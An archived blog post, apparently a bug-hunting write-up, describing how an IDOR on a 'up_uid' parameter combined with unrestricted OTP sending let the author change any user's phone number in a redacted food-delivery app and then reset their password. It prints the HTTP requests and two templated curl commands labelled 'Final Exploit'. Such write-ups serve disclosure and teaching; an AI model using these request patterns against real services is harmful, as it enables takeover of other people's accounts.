@@ -1,0 +1,470 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!-->
+<html class="no-js" lang="en">
+<!--<![endif]-->
+
+<head><script type="text/javascript" src="/_static/js/bundle-playback.js?v=HxkREWBo" charset="utf-8"></script>
+<script type="text/javascript" src="/_static/js/wombat.js?v=txqj7nKC" charset="utf-8"></script>
+<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
+<script type="text/javascript" src="/_static/js/ruffle/ruffle.js"></script>
+<script type="text/javascript">
+    __wm.init("https://web.archive.org/web");
+  __wm.wombat("https://s0cket7.com/idor-account-takeover/","20220309092244","https://web.archive.org/","web","/_static/",
+	      "1646817764");
+</script>
+<link rel="stylesheet" type="text/css" href="/_static/css/banner-styles.css?v=S1zqJCYt" />
+<link rel="stylesheet" type="text/css" href="/_static/css/iconochive.css?v=3PDvdIFv" />
+<!-- End Wayback Rewrite JS Include -->
+
+  <meta charset="utf-8">
+<title>IDOR leads to account takeover &#8211; s0cket7</title>
+<meta name="description" content="A quick bug writeup on IDOR and OTP abuse which led to full account takeover"> 
+<meta name="keywords" content="WebSec, IDOR, Bug"> 
+<!-- Twitter Cards -->
+
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="/web/20220309092244im_/https://s0cket7.com/images/">
+<meta name="twitter:title" content="IDOR leads to account takeover">
+<meta name="twitter:description" content="A quick bug writeup on IDOR and OTP abuse which led to full account takeover">
+<meta name="twitter:creator" content="@s0cket7">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IDOR leads to account takeover">
+<meta property="og:description" content="A quick bug writeup on IDOR and OTP abuse which led to full account takeover">
+<meta property="og:url" content="/web/20220309092244/https://s0cket7.com/idor-account-takeover/">
+<meta property="og:site_name" content="s0cket7">   
+<link rel="canonical" href="/web/20220309092244/https://s0cket7.com/idor-account-takeover/">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/web/20220309092244cs_/https://s0cket7.com/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//web.archive.org/web/20220309092244cs_/https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="/web/20220309092244js_/https://s0cket7.com/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Load Jquery -->
+<script src="/web/20220309092244js_/https://s0cket7.com/assets/js/vendor/jquery-1.9.1.min.js"></script>
+
+<!-- Icons -->
+<!-- 32x32 -->
+<link rel="shortcut icon" href="/web/20220309092244im_/https://s0cket7.com/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="/web/20220309092244im_/https://s0cket7.com/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/web/20220309092244im_/https://s0cket7.com/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/web/20220309092244im_/https://s0cket7.com/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/web/20220309092244im_/https://s0cket7.com/images/apple-touch-icon-144x144-precomposed.png"> 
+
+<!-- Back to Top -->
+<script src="/web/20220309092244js_/https://s0cket7.com/assets/js/btt.js"></script>
+
+</head>
+
+<body id="post">
+
+  <!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]--> <nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="/web/20220309092244/https://s0cket7.com/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="/web/20220309092244im_/https://s0cket7.com/images/avatar.png" alt="s0cket7 photo" class="author-photo">
+					<h4>s0cket7</h4>
+					<p>20, InfoSec Addict</p>
+				</li>
+				<li><a href="/web/20220309092244/https://s0cket7.com/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="https://web.archive.org/web/20220309092244/mailto:sp4c3j4ck@gmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://web.archive.org/web/20220309092244/https://twitter.com/s0cket7"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				
+				
+				
+				<li>
+					<a href="https://web.archive.org/web/20220309092244/https://github.com/s0cket7"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="/web/20220309092244/https://s0cket7.com/posts/">All Posts</a></li>
+				<li><a href="/web/20220309092244/https://s0cket7.com/tags/">All Tags</a></li>
+			</ul>
+		</li>
+		
+	    
+	    <li><a href="/web/20220309092244/https://s0cket7.com/disclaimer/">Disclaimer</a></li>
+	  
+	    
+	    <li><a href="https://web.archive.org/web/20220309092244/https://twitter.com/s0cket7" target="_blank">Twitter</a></li>
+	  
+	    
+	    <li><a href="/web/20220309092244/https://s0cket7.com/ctf.txt">CTFs</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+ 
+
+  <div id="main" role="main">
+    <article class="hentry">
+      <header class="header-title">
+        <div class="header-title-wrap">
+          
+          <h1 class="entry-title">
+            <a href="/web/20220309092244/https://s0cket7.com/idor-account-takeover/" rel="bookmark" title="IDOR leads to account takeover">IDOR leads to account takeover</a>
+          </h1>
+          
+          <h2>
+            <span class="entry-date date published">
+              <time datetime="2018-08-16T00:00:00-04:00">August 16, 2018</time>
+            </span>
+          </h2>
+          
+          <p class="entry-reading-time">
+            <i class="fa fa-clock-o"></i>
+            
+Reading time ~5 minutes
+          </p>
+          <!-- /.entry-reading-time -->
+          
+        </div>
+        <!-- /.header-title-wrap -->
+      </header>
+      <div class="entry-content">
+        <h2 id="utldru"><u>TL;DR</u></h2>
+<p>Insecure Direct Object Reference with an OTP abuse bug led to full account takeover.</p>
+
+<!--break-->
+
+<h2 id="uthings-to-noteu"><u>Things to Note</u></h2>
+<ul>
+  <li>Read the <a href="/web/20220309092244/https://s0cket7.com/disclaimer/">Disclaimer</a> before reading this post.</li>
+  <li>I can’t really talk about the android app, because of it’s private nature. So I’ve redacted a couple of things like the domain, auth tokens and stuff like that, but you should be able to understand how this bug works.</li>
+</ul>
+
+<h2 id="uintroductionu"><u>Introduction</u></h2>
+<p>The app that I tested was a food delivery app. As usual, we get to have an account of our own, we can order food from different restaurants and stuff like that. After finding an SQL injection on the site, I wanted to find a “not so common bug”. So I started looking around and I actually found an Insecure Direct Object Reference(IDOR) vulnerability and with a little more work, I could completely takeover any account. I’ve broken down these steps into multiple sections, so you guys can understand it better.</p>
+
+<h2 id="ustage-1---information-disclosureu"><u>Stage 1 - Information Disclosure</u></h2>
+<p>When I was looking at the login mechanism of the app, I noticed that the app was receiving some sensitive data back, even if the authentication failed.</p>
+
+<p><strong>Request</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/auth</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Dalvik/2.1.0 (Linux; U; Android 6.0.1; ONE A2003 Build/MOB31E)</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">████████████████.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">86</span>
+
+user_email=s0cket7@s0cket7.com&amp;user_passwd=this-is-not-a-valid-password&amp;user_auth=true</code></pre></figure>
+
+<p><strong>Response</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 16 Aug 2018 16:55:27 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">151</span>
+
+{
+  "user_data": [
+    {
+      "auth_status": "true",
+      "USER_ID": "123456",
+      "USER_NAME": "Socket Seven",
+      "EMAIL": "s0cket7@s0cket7.com",
+      "PHONE": "0123456789",
+      "USER_IMAGE": null
+    }
+  ]
+}</code></pre></figure>
+
+<p>As you can see, there’s the <code class="highlighter-rouge">PHONE</code> key in the JSON response which has the phone number as the value of it. Clearly Information Disclosure, but let’s keep digging. I noticed that there was this <code class="highlighter-rouge">USER_ID</code> key, and kept it in the back of my head.</p>
+
+<p>And YES I see the <code class="highlighter-rouge">Content-Type: text/html; charset=UTF-8</code>, I could trigger an XSS via my <code class="highlighter-rouge">USER_NAME</code> or something, but this is an android app, I don’t want to popup alerts on their API domains.</p>
+
+<h2 id="ustage-2---otp-abuseu"><u>Stage 2 - OTP Abuse</u></h2>
+<p>Since I wanted to takeover the account, I thought I could abuse the password reset functionality. I looked at it and it required a phone number, to which an OTP would be sent to. I believe it didn’t have any rate limiting, but it sure had the time limit of about 60 seconds. I thought I could bruteforce since the OTP was only 4 digits, but it’s something obvious to try, so I thought let’s look for some other way and if I ran out of ideas, then maybe fallback to this one. Alright now I wanted to somehow get the OTP of another user, I looked at it and tried a bunch of ways, it didn’t work. But I noticed that I could send OTPs to any number I want randomly. So I sent a request to my number and received an OTP.</p>
+
+<p><strong>Request</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/otp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Dalvik/2.1.0 (Linux; U; Android 6.0.1; ONE A2003 Build/MOB31E)</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">████████████████.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">34</span>
+
+up_ph=0987654321&amp;upph_request=true</code></pre></figure>
+
+<p><strong>Response</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 16 Aug 2018 16:55:27 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">19</span>
+
+true</code></pre></figure>
+
+<p>Ok can’t do much now either, and I just did more recon thinking that this could help somewhere else.</p>
+
+<h2 id="ustage-3---idor-in-preferencesu"><u>Stage 3 - IDOR in Preferences</u></h2>
+<p>When I was looking at the settings activity, I saw that I could change my phone number. So I quickly tried to change it, but the catch was whenever you try to change the phone number, you’d get another OTP with which you have to verify the phone number. I went through my burp history, saw that there were 2 requests made to the server to verify and update the phone number.</p>
+
+<ol>
+  <li>A request was made to generate a new OTP and send a SMS to the phone.</li>
+  <li>Verification request was made, if the OTP was correct, it would update the phone number.</li>
+</ol>
+
+<p>The <code class="highlighter-rouge">1st</code> request looked exactly like the <u>Stage-2</u>.</p>
+
+<p><strong>Request</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/otp</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Dalvik/2.1.0 (Linux; U; Android 6.0.1; ONE A2003 Build/MOB31E)</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">████████████████.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">34</span>
+
+up_ph=0987654321&amp;upph_request=true</code></pre></figure>
+
+<p><strong>Response</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 16 Aug 2018 16:59:12 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">19</span>
+
+true</code></pre></figure>
+
+<p>The <code class="highlighter-rouge">2nd</code> request looked something like this.</p>
+
+<p><strong>Request</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/update</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Dalvik/2.1.0 (Linux; U; Android 6.0.1; ONE A2003 Build/MOB31E)</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">████████████████.com</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">67</span>
+
+up_uid=123456&amp;upvf_ph=0987654321&amp;user_nme_update=true&amp;upvf_pin=8859</code></pre></figure>
+
+<p><strong>Response</strong></p>
+
+<figure class="highlight"><pre><code class="language-http" data-lang="http"><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3 (Ubuntu)</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 16 Aug 2018 17:12:56 GMT</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">19</span>
+
+true</code></pre></figure>
+
+<p>As you can see in the request it takes in <code class="highlighter-rouge">up_uid</code> which has the value of <strong>123456</strong>. We can also see the same User-ID in the <u>Stage-1</u> response. So I simply changed the <code class="highlighter-rouge">up_uid</code> to one of my other test account and replayed the request with a new otp. And it did change the phone number of my other account. This is a classic IDOR issue. The server blindly updates the phone number of the account via the <code class="highlighter-rouge">up_uid</code> parameter.</p>
+
+<p>So now I could simply generate an OTP with the <u>Stage-2</u> request and change the phone number using the IDOR bug from the <u>Stage-3</u>.</p>
+
+<h3 id="final-exploit">Final Exploit</h3>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Generate OTP</span>
+curl -i -s -k  -X <span class="nv">$'</span>POST<span class="s1">' \
+  -H $'</span>Content-Type: application/x-www-form-urlencoded; <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="s1">' \
+  -H $'</span>User-Agent: Dalvik/2.1.0 <span class="o">(</span>Linux; U; Android 6.0.1; ONE A2003 Build/MOB31E<span class="o">)</span><span class="s1">' \
+  -H $'</span>Host: REDACTED.com<span class="s1">' \
+  -H $'</span>Connection: close<span class="s1">' \
+  -H $'</span>Accept-Encoding: gzip, deflate<span class="s1">' \
+  -H $'</span>Content-Length: 34<span class="s1">' \
+  --data-binary $'</span><span class="nv">up_ph</span><span class="o">=[</span>NEW NUMBER]&amp;upph_request<span class="o">=</span><span class="nb">true</span><span class="s1">' \
+  $'</span>https://REDACTED.com/otp<span class="s1">';</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># IDOR </span>
+curl -i -s -k  -X <span class="nv">$'</span>POST<span class="s1">' \
+  -H $'</span>Content-Type: application/x-www-form-urlencoded; <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="s1">' \
+  -H $'</span>User-Agent: Dalvik/2.1.0 <span class="o">(</span>Linux; U; Android 6.0.1; ONE A2003 Build/MOB31E<span class="o">)</span><span class="s1">' \
+  -H $'</span>Host: REDACTED.com<span class="s1">' \
+  -H $'</span>Connection: close<span class="s1">' \
+  -H $'</span>Accept-Encoding: gzip, deflate<span class="s1">' \
+  -H $'</span>Content-Length: 67<span class="s1">' \
+  --data-binary $'</span><span class="nv">up_uid</span><span class="o">=[</span>USER_ID]&amp;upvf_ph<span class="o">=[</span>NEW NUMBER]&amp;user_nme_update<span class="o">=</span><span class="nb">true</span>&amp;upvf_pin<span class="o">=[</span>OTP]<span class="s1">' \
+  $'</span>https://REDACTED.com/update<span class="s1">'</span></code></pre></figure>
+
+<p>In the end we can do a simple forgot password and provide the new number which was updated to the victim’s account and reset the password. Erogo account takeover.</p>
+
+<hr/>
+
+<p><em>That’s all for now folks. Thank you for reading. Have a great day :)</em></p>
+
+<p><strong>– s0cket7</strong></p>
+
+        <footer class="entry-meta">
+          <span class="entry-tags">
+            <a href="/web/20220309092244/https://s0cket7.com/tags/#WebSec" title="Pages tagged WebSec" class="tag">
+              <span class="term">WebSec</span>
+            </a>
+            <a href="/web/20220309092244/https://s0cket7.com/tags/#IDOR" title="Pages tagged IDOR" class="tag">
+              <span class="term">IDOR</span>
+            </a>
+            <a href="/web/20220309092244/https://s0cket7.com/tags/#Bug" title="Pages tagged Bug" class="tag">
+              <span class="term">Bug</span>
+            </a></span>
+          
+          <span>Updated on
+            <span class="entry-date date updated">
+              <time datetime="2018-08-16 08:27:45 -0400">August 16, 2018</time>
+            </span>
+          </span>
+          <span class="author vcard">
+            <span class="fn">s0cket7</span>
+          </span> <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook">
+      <a href="https://web.archive.org/web/20220309092244/https://www.facebook.com/sharer/sharer.php?u=https://s0cket7.com/idor-account-takeover/" title="Share on Facebook">
+        <span class="count">
+          <i class="fa fa-facebook-square"></i> Share</span>
+      </a>
+    </li>
+    <li class="twitter">
+      <a href="https://web.archive.org/web/20220309092244/https://twitter.com/intent/tweet?text=https://s0cket7.com/idor-account-takeover/" title="Share on Twitter">
+        <span class="count">
+          <i class="fa fa-twitter-square"></i> Tweet</span>
+      </a>
+    </li>
+    <li class="googleplus">
+      <a href="https://web.archive.org/web/20220309092244/https://plus.google.com/share?url=https://s0cket7.com/idor-account-takeover/" title="Share on Google Plus">
+        <span class="count">
+          <i class="fa fa-google-plus-square"></i> +1</span>
+      </a>
+    </li>
+  </ul>
+</div>
+<!-- /.social-share -->
+
+        </footer>
+      </div>
+      <!-- /.entry-content -->
+       <div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="/web/20220309092244/https://s0cket7.com/open-redirect-vulnerability/" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="/web/20220309092244/https://s0cket7.com/picoctf-web/" title="Pico CTF 2018 Web Exploitation Writeup">Pico CTF 2018 Web Exploitation Writeup</a></h3>
+      <p>A writeup of all 18 Web Challenges from PicoCTF <a href="/web/20220309092244/https://s0cket7.com/picoctf-web/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      <div class="list-item">
+        <h4><a href="/web/20220309092244/https://s0cket7.com/open-redirect-vulnerability/" title="Open Redirect Vulnerability">Open Redirect Vulnerability</a></h4>
+        <span>Published on August 15, 2018</span>
+      </div><!-- /.list-item -->
+    
+      <div class="list-item">
+        <h4><a href="/web/20220309092244/https://s0cket7.com/beginner-linux-ctf/" title="Beginner Linux CTF Walk-through">Beginner Linux CTF Walk-through</a></h4>
+        <span>Published on August 11, 2018</span>
+      </div><!-- /.list-item -->
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+    </article>
+  </div>
+  <!-- /#main -->
+
+  <div class="footer-wrapper">
+    <footer role="contentinfo">
+      <span>&copy; 2018 s0cket7. Powered by
+    <a href="https://web.archive.org/web/20220309092244/http://jekyllrb.com/" rel="nofollow">Jekyll</a>
+
+
+    <a href="#" id="back-to-top">
+        <!-- <button class="btn x-btn">Top</button> -->
+        <i id="btt-svg" class="fa fa-arrow-circle-up fa-2x" style="color:white"></i>
+    </a>
+    </footer>
+  </div>
+  <!-- /.footer-wrapper -->
+
+  <script src="//web.archive.org/web/20220309092244js_/https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="/web/20220309092244js_/https://s0cket7.com/assets/js/scripts.min.js"></script>
+
+<!-- Font-Awesome -->
+<!-- <script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy" crossorigin="anonymous"></script> -->
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+    (function (i, s, o, g, r, a, m) {
+    i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date(); a = s.createElement(o),
+      m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+    })(window, document, 'script', '//web.archive.org/web/20220309092244/https://www.google-analytics.com/analytics.js', 'ga');
+
+  ga('create', 'UA-123913804-1', 'auto');
+  ga('require', 'linkid', 'linkid.js');
+  ga('send', 'pageview');
+</script>  
+
+<!-- TrustedSite Trustmark -->
+<script type="text/javascript" src="https://web.archive.org/web/20220309092244js_/https://cdn.ywxi.net/js/1.js" async></script>
+
+</body>
+
+</html><!--
+     FILE ARCHIVED ON 09:22:44 Mar 09, 2022 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 07:40:42 Jan 11, 2025.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  captures_list: 0.546
+  exclusion.robots: 0.031
+  exclusion.robots.policy: 0.021
+  esindex: 0.012
+  cdx.remote: 10.445
+  LoadShardBlock: 207.627 (3)
+  PetaboxLoader3.datanode: 293.966 (6)
+  load_resource: 326.173 (2)
+  PetaboxLoader3.resolve: 151.07 (2)
+  loaddict: 43.412
+-->
